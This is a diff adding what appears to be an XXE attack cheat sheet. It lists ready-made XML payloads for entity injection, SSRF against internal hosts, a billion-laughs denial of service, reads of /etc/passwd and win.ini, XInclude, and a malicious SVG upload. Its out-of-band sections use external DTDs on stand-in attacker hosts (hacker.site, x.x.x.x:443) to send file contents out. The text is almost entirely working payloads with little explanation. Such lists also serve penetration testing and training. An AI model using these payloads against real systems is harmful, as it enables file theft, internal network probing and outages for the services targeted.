@@ -1,0 +1,105 @@
+# ----- detections
+    10'
+    30"
+    &moscu;
+    <moscu>
+    &moscu
+    <script><![CDATA[alert]]>('moscu')</script>
+    <![CDATA[<]]>script<![CDATA[>]]>alert('moscu')<![CDATA[<]]>/script<![CDATA[>]]>
+    <role{NEW_LINE}>1</role{NEW_LINE}>
+    # ----- xxe via modified content type
+    <?xml version="1.0" encoding="UTF-8"?><parm1>val1</parm1><parm2>val2</parm2>
+
+
+# ----- inject new entity
+<!DOCTYPE moskova [<!ENTITY moscu "Russia"> ]>
+&moscu;
+
+# ----- xxe to perform SSRF attacks
+<!DOCTYPE muskova [ <!ENTITY moscu SYSTEM "http://internal.vulnerable-website.com/"> ]>
+
+# ----- xxe denial of service
+<!--?xml version="1.0" ?-->
+<!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
+<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;
+<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+<tag>&lol9;</tag>
+
+# ----- local file inclusion
+<?xml version="1.0"?>
+<!DOCTYPE moskova [  
+    <!ELEMENT moskova (#ANY)>
+    <!ENTITY moscu SYSTEM "file:///etc/passwd">
+]>
+<moskova>&moscu;</moskova>
+
+# ----- local file inclusion | Blind Local File Inclusion
+<?xml version="1.0"?>
+<!DOCTYPE moskova [
+<!ELEMENT moskova (#ANY)>
+<!ENTITY % moscu SYSTEM "file:///etc/passwd">
+<!ENTITY blind SYSTEM "https://www.example.com/?%moscu;">]>
+<moskova>&blind;</moskova>
+
+
+# ----- local file inclusion | out of band 1
+    # ----- ----- injection xxe
+        <!DOCTYPE message [
+            <!ENTITY % a "<![CDATA[">
+            <!ENTITY % xxefile SYSTEM "file:///path/to/config.php">
+            <!ENTITY % z "]]>">
+            <!ENTITY % ExtDTD SYSTEM "http://hacker.site/xml/xxe/evil.dtd">
+            %ExtDTD;
+        ]>
+            <message>
+                <body>&join;</body>
+            </message>
+    # ----- ----- external dtd
+        <!ENTITY join "%a;%xxefile;%z;">
+
+
+# ----- local file inclusion | out of band 2
+    # ----- ----- injection xxe
+    <?xml version="1.0" ?>
+    <!DOCTYPE r [
+    <!ELEMENT r ANY >
+    <!ENTITY % sp SYSTEM "http://x.x.x.x:443/ev.dtd">
+    %sp;
+    %param1;
+    ]>
+    <r>&exfil;</r>
+
+    # ----- ----- external dtd
+    <!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
+    <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://x.x.x.x:443/?%data;'>">
+
+    # ----- ----- Note:
+        - We can usign internal methods to decode the files for avoiding any XML parsing error, for example:  
+            <!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+
+
+# ----- XInclude subdocument
+<moscu xmlns:xi="http://www.w3.org/2001/XInclude">
+    <xi:include parse="text" href="file:///etc/passwd"/>
+</moscu>
+
+
+# ----- xxe via file upload
+    # ----- ----- SVG
+    <?xml version="1.0" standalone="yes"?>
+    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> 
+    ]>
+    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+
+
+
+
+
+
